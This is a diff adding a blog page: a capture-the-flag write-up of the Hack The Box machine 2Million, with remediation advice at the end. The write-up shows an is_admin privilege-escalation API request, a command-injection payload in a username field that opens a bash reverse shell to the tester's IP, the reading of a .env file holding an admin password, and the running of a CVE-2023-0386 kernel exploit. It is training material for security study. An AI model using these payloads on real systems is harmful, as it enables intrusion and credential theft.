@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>2Million - Hack The Box</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .opaque-bg {
+            background-color: rgba(13, 13, 13, 0.6);
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+
+        .content .left-aligned-content {
+            text-align: left !important;
+            max-width: 800px;
+            margin: 0 20px !important;
+            padding: 20px 0 !important;
+        }
+
+        .content .left-aligned-content h1,
+        .content .left-aligned-content h2,
+        .content .left-aligned-content p,
+        .content .left-aligned-content ul,
+        .content .left-aligned-content ol,
+        .content .left-aligned-content li {
+            text-align: left !important;
+        }
+
+        .content .left-aligned-content a {
+            color: #ff9933 !important;
+            text-decoration: underline;
+        }
+
+        .content .left-aligned-content a:hover {
+            color: #ff007a !important;
+            text-shadow: 0 0 5px #ff007a;
+        }
+
+        .content .left-aligned-content img {
+            margin: 20px 0 !important;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .content .left-aligned-content {
+                margin: 0 10px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Nav Bar -->
+    <nav>
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="/about.html">About</a></li>
+            <li><a href="/projects.html">Projects</a></li>
+            <li><a href="/code.html">Code & Tools</a></li>
+            <li><a href="/ctf.html">Write-ups</a></li>
+            <li><a href="/research.html">Research</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="opaque-bg" id="opaqueBg"></div>
+    <div class="content">
+        <div class="left-aligned-content">
+            <h1>Two Million - Hack The Box</h1>
+            <img src="/assets/images/ctf/2m/2million cover.png" alt="2Million Cover">
+            <h2>1. Box Overview</h2>
+            <p>
+                TwoMillion is a easy Linux machine from Hack The Box, featuring an Nginx web server on port 80 hosting an HTB-themed website and SSH on port 22. The challenge involves exploiting an insecure API to gain an invite code, escalating privileges through a misconfigured API endpoint, achieving command injection for an initial shell, and leveraging a vulnerable OverlayFS (CVE-2023-0386) for root access. This box teaches API enumeration, privilege escalation, and vulnerability exploitation.
+            </p>
+            <ul>
+                <li><strong>Objective:</strong> Gain user access via SSH and escalate to root to capture both flags.</li>
+                <li><strong>Skills Developed:</strong> Nmap scanning, API enumeration, Burp Suite analysis, command injection, and CVE-2023-0386 exploitation.</li>
+                <li><strong>Platform:</strong> Hack The Box</li>
+            </ul>
+
+            <h2>2. Resources Used</h2>
+            <p>Here are the key resources that guided my approach:</p>
+            <ul>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html">HTB: 2Million Writeup</a></br>
+                    Usage: Provided detailed steps for exploiting the API and CVE-2023-0386, particularly for privilege escalation.
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://github.com/xkaneiki/CVE-2023-038">POC Github</a></br>
+                    Usage: Offered a proof-of-concept for exploiting the OverlayFS vulnerability (CVE-2023-0386).
+                </li>
+                <li>
+                    <strong>Resource:</strong><br>
+                    Title: <a href="https://gchq.github.io/CyberChef/">CyberChef</a><br>
+                    Usage: Used for decoding ROT13 and Base64 encoded invite codes.
+                </li>
+            </ul>
+
+            <h2>3. My Approach to Pwning 2Million</h2>
+
+            <h3>Step 1: Initial Recon with Nmap</h3>
+            <p>
+                I began with an Nmap scan to identify open ports and services on the target (10.10.11.221). The scan revealed SSH (port 22) and an Nginx web server (port 80) redirecting to <code>2million.htb</code>, indicating a Linux host.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>nmap -sV -sC --open -T4 10.10.11.221</code></pre>
+            <p>
+                <strong>Why:</strong> The <code>-T4</code> flag speeds up the scan, <code>-sV</code> detects service versions, <code>-sC</code> runs default scripts, and <code>--open</code> filters for open ports. The scan showed OpenSSH 8.9p1 and Nginx, with a redirect to <code>2million.htb</code>, suggesting a web-based entry point.
+            </p>
+            <img src="/assets/images/ctf/2m/1.png" alt="Nmap scan results">
+
+            <h3>Step 2: Adding Hostname to /etc/hosts</h3>
+            <p>
+                To resolve <code>2million.htb</code>, I added it to my <code>/etc/hosts</code> file.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts</code></pre>
+            <p>
+                <strong>Why:</strong> This ensures the browser resolves <code>2million.htb</code> to the target IP, allowing access to the web application.
+            </p>
+
+            <h3>Step 3: Exploring the 2Million Website</h3>
+            <p>
+                Visiting <code>http://2million.htb</code>, I found an HTB-themed homepage with sections for stats, FAQs, labs, a "Join the HTB" link, and a login page. The <code>/invite</code> page prompted for an invite code, suggesting a registration barrier.
+            </p>
+            <p><strong>Why:</strong> The invite system hinted at an API-driven process, making it a potential attack vector for further enumeration.
+            </p>
+            <img src="/assets/images/ctf/2m/3.png" alt="2Million homepage">
+            <img src="/assets/images/ctf/2m/3a.png" alt="2Million homepage">
+            <img src="/assets/images/ctf/2m/3b.png" alt="2Million homepage">
+
+            <h3>Step 4: Analyzing the Invite Page with Burp Suite</h3>
+            <p>
+                I used Burp Suite to inspect traffic on the <code>/invite</code> page and noticed it loaded <code>inviteapi.min.js</code>. Examining the JavaScript, I identified a <code>makeInviteCode</code> function. In the browser’s DevTools console, typing <code>makeInvite</code> autocompleted and revealed the endpoint <code>/api/v1/invite/how/to/generate</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>GET /api/v1/invite/how/to/generate HTTP/1.1
+Host: 2million.htb</code></pre>
+            <p>
+                <strong>Why:</strong> The JavaScript provided clues to hidden API endpoints, and the autocomplete feature in DevTools confirmed the endpoint for generating invite codes.
+            </p>
+            <img src="/assets/images/ctf/2m/4.png" alt="Invite page analysis">
+            <img src="/assets/images/ctf/2m/4b.png" alt="Invite page analysis">
+            <img src="/assets/images/ctf/2m/4a.png" alt="Invite page analysis">
+            
+
+            <h3>Step 5: Decoding the Invite Instructions</h3>
+            <p>
+                A POST request to <code>/api/v1/invite/how/to/generate</code> via Burp Suite’s Repeater returned a 200 response with a ROT13-encoded message: <code>"In order to generate the invite code, make a POST request to /api/v1/invite/generate"</code>. I used CyberChef to decode it.
+            </p>
+            <p><strong>Why:</strong> The encoded response provided clear instructions for the next API call to obtain an invite code.
+            </p>
+            <img src="/assets/images/ctf/2m/5.png" alt="ROT13 decoding">
+            <img src="/assets/images/ctf/2m/5a.png" alt="ROT13 decoding">
+
+            <h3>Step 6: Generating the Invite Code</h3>
+            <p>
+                Following the decoded instructions, I sent a POST request to <code>/api/v1/invite/generate</code>, receiving a Base64-encoded invite code: <code>BFF5F-G6X49-CNA7V-KFPJX</code>. I decoded it using CyberChef and used it on the <code>/invite</code> page to access the registration page.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>POST /api/v1/invite/generate HTTP/1.1
+Host: 2million.htb
+Content-Type: application/json</code></pre>
+            <p>
+                <strong>Why:</strong> The invite code unlocked the registration page, allowing account creation and access to the user dashboard.
+            </p>
+            <img src="/assets/images/ctf/2m/6.png" alt="Invite code generation">
+            <img src="/assets/images/ctf/2m/6a.png" alt="Invite code generation">
+            <img src="/assets/images/ctf/2m/6c.png" alt="Invite code generation">
+            <img src="/assets/images/ctf/2m/6d.png" alt="Invite code generation">
+
+            <h3>Step 7: Exploring the User Dashboard</h3>
+            <p>
+                After registering and logging in, the dashboard provided access to pages like changelog, rules, and access. The changelog mentioned API user disclosure issues and admin usernames, while the access page allowed generating an OpenVPN configuration file via <code>/api/v1/user/vpn/generate</code>.
+            </p>
+            <p><strong>Why:</strong> The changelog hinted at API vulnerabilities, and the VPN generation endpoint suggested potential privilege escalation opportunities.
+            </p>
+            <img src="/assets/images/ctf/2m/7a.png" alt="User dashboard">
+            <img src="/assets/images/ctf/2m/7.png" alt="User dashboard">
+            <img src="/assets/images/ctf/2m/7b.png" alt="User dashboard">
+            <img src="/assets/images/ctf/2m/7c.png" alt="User dashboard">
+
+            <h3>Step 8: Enumerating API Endpoints</h3>
+            <p>
+                A GET request to <code>/api/v1</code> returned a list of endpoints, including user and admin sections:
+            </p>
+            <pre><code>"PUT":"/api/v1/admin/settings/update":"Update user settings"code></pre>
+            <p>
+                <strong>Why:</strong> The admin endpoints, particularly <code>/api/v1/admin/settings/update</code>, suggested a potential privilege escalation vector.
+            </p>
+            <img src="/assets/images/ctf/2m/8.png" alt="API endpoint list">
+
+            <h3>Step 9: Attempting Privilege Escalation via API</h3>
+            <p>
+                I tested the <code>/api/v1/admin/auth</code> endpoint, which confirmed I wasn’t an admin. Then, I tried a PUT request to <code>/api/v1/admin/settings/update</code> to escalate my account to admin status. Initial attempts returned a content-type error, so I added <code>Content-Type: application/json</code>. Subsequent errors indicated missing <code>email</code> and <code>is_admin</code> parameters. Setting <code>is_admin: 1</code> in the JSON payload succeeded, granting admin privileges to my account.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>PUT /api/v1/admin/settings/update HTTP/1.1
+Host: 2million.htb
+Content-Type: application/json
+Content-Length: 45
+
+{"email":"user@2million.htb","is_admin":1}</code></pre>
+            <p>
+                <strong>Why:</strong> The API lacked proper authorization checks, allowing me to escalate my account to admin status.
+            </p>
+            <img src="/assets/images/ctf/2m/9.png" alt="Privilege escalation">
+            <img src="/assets/images/ctf/2m/9a.png" alt="Privilege escalation">
+            <img src="/assets/images/ctf/2m/9b.png" alt="Privilege escalation">
+            <img src="/assets/images/ctf/2m/9c.png" alt="Privilege escalation">
+            <img src="/assets/images/ctf/2m/9d.png" alt="Privilege escalation">
+
+            <h3>Step 10: Command Injection via Admin VPN Endpoint</h3>
+            <p>
+                With admin privileges, I tested the <code>/api/v1/admin/vpn/generate</code> endpoint, which accepted a <code>username</code> parameter. I injected a command using <code>janedoe; bash -c 'sh -i >& /dev/tcp/10.10.14.208/4479 0>&1' #</code>, setting up a Netcat listener to catch the reverse shell.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>POST /api/v1/admin/vpn/generate HTTP/1.1
+Host: 2million.htb
+Content-Type: application/json
+Content-Length: 34
+
+{"username": "janedoe; bash -c 'sh -i >& /dev/tcp/10.10.14.208/4479 0>&1' #"}</code></pre>
+            <p>
+                <strong>Why:</strong> The endpoint failed to sanitize the <code>username</code> input, allowing command injection and a reverse shell as the <code>www-data</code> user.
+            </p>
+            <img src="/assets/images/ctf/2m/10.png" alt="Command injection">
+            <img src="/assets/images/ctf/2m/10a.png" alt="Command injection">
+            <img src="/assets/images/ctf/2m/10b.png" alt="Command injection">
+            <img src="/assets/images/ctf/2m/10c.png" alt="Command injection">
+
+            <h3>Step 11: Enumerating the System</h3>
+            <p>
+                In the reverse shell, I checked <code>/etc/passwd</code>, identifying the <code>admin</code> user. Exploring the filesystem, I found a <code>database.php</code> file and a <code>.env</code>.  In the database file it showed enviromental varibles for a pwd. so looking in the .env file it contained the admin password: <code>SuperDuperPass123</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>cat /var/www/html/.env</code></pre>
+            <p>
+                <strong>Why:</strong> The <code>.env</code> file often contains sensitive credentials, and this provided SSH access as the <code>admin</code> user.
+            </p>
+            <img src="/assets/images/ctf/2m/11.png" alt=".env file">
+            <img src="/assets/images/ctf/2m/11a.png" alt=".env file">
+            <img src="/assets/images/ctf/2m/11b.png" alt=".env file">
+
+            <h3>Step 12: Gaining User Access via SSH</h3>
+            <p>
+                I used the password to SSH as <code>admin</code> and retrieved the user flag from <code>/home/admin/user.txt</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>ssh admin@2million.htb</code></pre>
+            <p>
+                <strong>Why:</strong> The cracked password granted SSH access, completing the user objective.
+            </p>
+            <img src="/assets/images/ctf/2m/12.png" alt="User flag">
+            <img src="/assets/images/ctf/2m/12a.png" alt="User flag">
+
+            <h3>Step 13: Enumerating for Privilege Escalation</h3>
+            <p>
+                I ran <code>sudo -l</code>, but the <code>admin</code> user had no sudo privileges. Checking the mail directory, I found an email referencing a potential OverlayFS vulnerability (CVE-2023-0386). I researched the CVE using the PoC at <a href="https://github.com/xkaneiki/CVE-2023-0386">GitHub</a>. The POC did not have the best read me so I ended up having to reference a walk through from Oxdf to learn how to excute. (linked in reasources)
+            </p>
+            <p><strong>Why:</strong> The email provided a lead to a kernel vulnerability, critical for privilege escalation.
+            </p>
+            <img src="/assets/images/ctf/2m/13.png" alt="Mail with CVE reference">
+            <img src="/assets/images/ctf/2m/13b.png" alt="Mail with CVE reference">
+            <img src="/assets/images/ctf/2m/13a.png" alt="Mail with CVE reference">
+            <img src="/assets/images/ctf/2m/13c.png" alt="Mail with CVE reference">
+
+            <h3>Step 14: Transferring and Running the CVE-2023-0386 Exploit</h3>
+            <p>
+                I downloaded the CVE-2023-0386 PoC, transferred it to the target, and unzipped it.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>scp CVE-2023-0386-main.zip admin@10.10.11.221:/home/admin</code></pre>
+            <p>
+                Following the walkthrough at <a href="https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html">0xdf’s GitLab</a>, I compiled the exploit with <code>make</code>, then ran <code>./fuse ./ovlcap/lower ./gc</code> in one terminal (which hung as expected) and <code>./exp</code> in another to gain root privileges.
+            </p>
+            <p><strong>Why:</strong> The OverlayFS vulnerability allowed mounting a filesystem with root privileges, enabling execution of the exploit binary as root.
+            </p>
+            <img src="/assets/images/ctf/2m/14.png" alt="Exploit transfer">
+            <img src="/assets/images/ctf/2m/14b.png" alt="Exploit transfer">
+            <img src="/assets/images/ctf/2m/14a.png" alt="Exploit transfer">
+            <img src="/assets/images/ctf/2m/14c.png" alt="Exploit transfer">
+
+            <h3>Step 15: Gaining Root Access</h3>
+            <p>
+                The exploit granted a root shell, allowing me to retrieve the root flag from <code>/root/root.txt</code>.
+            </p>
+            <p><strong>Command:</strong></p>
+            <pre><code>cat /root/root.txt</code></pre>
+            <p>
+                <strong>Why:</strong> The CVE-2023-0386 exploit inherited root permissions from the OverlayFS mount, completing the challenge.
+            </p>
+            <img src="/assets/images/ctf/2m/15.png" alt="Root flag">
+
+            <h2>4. Lessons Learned and Tips</h2>
+            <p>Here’s what I took away from 2Million:</p>
+            <ul>
+                <li><strong>Tip 1:</strong> Always inspect JavaScript files for hidden API endpoints, as they can reveal critical functionality like invite code generation.</li>
+                <li><strong>Tip 2:</strong> Test API endpoints for improper authorization, as misconfigurations can lead to privilege escalation.</li>
+                <li><strong>Tip 3:</strong> Command injection vulnerabilities in user inputs can provide initial shell access; use tools like Burp Suite to fuzz inputs.</li>
+                <li><strong>Key Lesson:</strong> Kernel vulnerabilities like CVE-2023-0386 can be powerful for privilege escalation; always check for recent CVEs during enumeration.</li>
+                <li><strong>Future Goals:</strong> Improve API fuzzing techniques and deepen knowledge of Linux kernel exploits.</li>
+            </ul>
+            
+
+            <h2>5. Securing and Remediating Vulnerabilities</h2>
+            <p>
+                To secure the 2Million machine against the exploited vulnerabilities, consider the following measures:
+            </p>
+            <ul>
+                <li><strong>API Authorization:</strong> Implement strict role-based access controls to prevent unauthorized users from accessing admin endpoints like <code>/api/v1/admin/settings/update</code>.</li>
+                <li><strong>Input Sanitization:</strong> Sanitize and validate all user inputs, especially in the <code>/api/v1/admin/vpn/generate</code> endpoint, to prevent command injection.</li>
+                <li><strong>Environment File Protection:</strong> Restrict access to sensitive files like <code>.env</code> by setting proper permissions and moving them outside the web root.</li>
+                <li><strong>Patch Kernel Vulnerabilities:</strong> Update the Linux kernel to a version not vulnerable to CVE-2023-0386 and apply security patches promptly.</li>
+                <li><strong>Secure JavaScript Exposure:</strong> Obfuscate or protect client-side JavaScript to avoid exposing sensitive API endpoints like <code>/api/v1/invite/how/to/generate</code>.</li>
+            </ul>
+
+            <h2>6. Conclusion</h2>
+            <p>
+                2Million was a challenging and rewarding CTF that combined web exploitation, API abuse, and kernel vulnerability exploitation. The journey from invite code generation to command injection and root access via CVE-2023-0386 highlighted the importance of thorough enumeration and creative exploitation techniques. This box was an excellent learning experience for mastering API security and privilege escalation.
+            </p>
+            <img src="/assets/images/ctf/2m/root pwn.png" alt="Completed">
+
+            <h2>7. Additional Notes</h2>
+            <ul>
+                <li>The <a href="https://github.com/xkaneiki/CVE-2023-0386">CVE-2023-0386 PoC</a> was critical for achieving root access.</li>
+                <li>Using tools like CyberChef streamlined the decoding process for invite codes.</li>
+                <li>The <a href="https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html">0xdf walkthrough</a> provided valuable guidance for executing the OverlayFS exploit.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically set the height of opaque-bg to match the document height
+        function setOpaqueBgHeight() {
+            const opaqueBg = document.getElementById('opaqueBg');
+            const docHeight = Math.max(
+                document.body.scrollHeight,
+                document.documentElement.scrollHeight,
+                document.body.offsetHeight,
+                document.documentElement.offsetHeight,
+                document.body.clientHeight,
+                document.documentElement.clientHeight
+            );
+            opaqueBg.style.height = `${docHeight - 50}px`;
+        }
+
+        window.addEventListener('load', setOpaqueBgHeight);
+        window.addEventListener('resize', setOpaqueBgHeight);
+    </script>
+</body>
+</html>
